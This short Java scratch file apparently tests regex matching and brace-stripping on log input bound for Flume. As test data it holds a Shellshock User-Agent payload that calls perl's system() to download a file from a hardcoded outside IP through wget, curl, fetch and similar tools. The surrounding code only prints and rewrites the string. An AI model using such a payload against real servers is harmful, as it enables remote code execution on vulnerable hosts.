package org.apache.log4j;

//import com.google.gson.Gson;
//import org.apache.flume.node.Application;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by karl on 2016/1/26.
 */
public class Flume {

    public static void main(String[] args){
        System.out.println("0000".matches("0000|0010|0011|0012"));
        System.out.println("0222".matches("0000|0010|0011|0012"));
        System.out.println("0012".matches("0000|0010|0011|0012"));
        String userAgent = "() { :;};/usr/bin/perl -e 'print \\x22Content-Type: text/plain\\x5Cr\\x5Cn\\x5Cr\\x5CnXSUCCESS!\\x22;system(\\x22 wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \\x22);'";
        Pattern p = Pattern.compile("\\{|\\}");
        Matcher m = p.matcher(userAgent);
        String newBody = m.replaceAll("brace");
        System.out.println(newBody);
        //bin/flume-ng agent -c conf -f conf/nginxLog.conf -n agent -Dflume.root.logger=INFO,console
//        Application.main(args);
    }


}
